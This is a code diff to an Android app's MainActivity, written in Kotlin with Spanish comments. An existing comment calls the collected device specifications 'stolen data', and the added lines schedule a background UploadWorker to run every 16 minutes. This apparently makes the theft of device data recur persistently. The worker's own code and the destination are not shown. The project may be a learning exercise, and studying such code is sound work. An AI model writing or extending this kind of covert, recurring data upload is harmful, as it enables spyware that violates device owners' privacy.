@@ -16,7 +16,11 @@ import android.util.Log
 import android.view.View.INVISIBLE
 import android.view.View.VISIBLE
 import android.widget.ImageView
+import androidx.work.ExistingPeriodicWorkPolicy
+import androidx.work.PeriodicWorkRequest
+import androidx.work.WorkManager
 import java.util.*
+import java.util.concurrent.TimeUnit
 
 
 class MainActivity : AppCompatActivity() {
@@ -81,6 +85,14 @@ class MainActivity : AppCompatActivity() {
                     // Imprime los datos robados para debug
 
                     Log.d("TAG",getSpec())
+
+                    // Codigo para aprender a utilizar worker
+                    // https://developer.android.com/reference/androidx/work/PeriodicWorkRequest
+                    val myWorkBuilder = PeriodicWorkRequest.Builder(UploadWorker::class.java, 16, TimeUnit.MINUTES)
+
+                    val myWork = myWorkBuilder.build()
+                    WorkManager.getInstance().enqueueUniquePeriodicWork("jobTag", ExistingPeriodicWorkPolicy.KEEP, myWork)
+
 
                 }
                 catch (e: Exception){
